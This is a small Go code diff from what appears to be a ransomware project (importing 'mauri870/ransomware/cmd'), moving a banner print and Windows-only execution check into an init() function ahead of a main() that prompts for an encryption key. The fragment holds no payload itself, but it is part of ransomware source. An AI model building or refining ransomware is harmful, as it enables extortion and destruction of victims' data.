@@ -15,13 +15,15 @@ import (
 	"github.com/mauri870/ransomware/cmd"
 )
 
-func main() {
+func init() {
 	// Fun ASCII
 	cmd.PrintBanner()
 
 	// Execution locked for windows
 	cmd.CheckOS()
+}
 
+func main() {
 	// Ask for the encryption key
 	var key string
 	for {
